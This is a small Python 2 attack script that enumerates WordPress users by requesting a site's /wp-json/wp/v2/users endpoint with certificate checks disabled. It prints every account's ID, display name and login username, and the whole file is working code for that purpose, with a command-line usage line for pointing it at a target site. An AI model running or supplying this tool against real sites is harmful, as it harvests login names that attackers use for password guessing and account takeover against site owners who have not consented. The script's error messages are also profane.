#!/usr/bin/python2
# coding: utf-8
import requests
import json
import sys

def grab_json(base_url):
    try:
        url = base_url + "/wp-json/wp/v2/users"
        r = requests.get(url, verify=False)
    except Exception:
        return False
    try: # this needs replacing with a regex check
        if "description" in r.text:
            return r.text
        else:
            return False
    except Exception:
        return False

def extract_users(the_json):
    try:
        fuck_json = json.loads(the_json)
    except Exception, e:
        print e
        sys.exit("{!} Fucking JSON wouldn't load")
    try:
        print "{*} Found %d users" %(len(fuck_json))
        for x in range(0, len(fuck_json)):
            user_id = fuck_json[x]['id']
            full_name = fuck_json[x]['name']
            user_name = fuck_json[x]['slug']
            print "{>} User ID: %s, Name: %s, Username: %s" %(user_id, full_name, user_name)
    except Exception:
        sys.exit("{!} Fuck, enumeration failure")

def main(args):
    if len(args) != 2:
        sys.exit("use: %s http://site.com/wordpress" %(args[0]))
    json = grab_json(base_url=args[1])
    if json != False:
        extract_users(the_json=json)

if __name__ == "__main__":
    main(args=sys.argv)
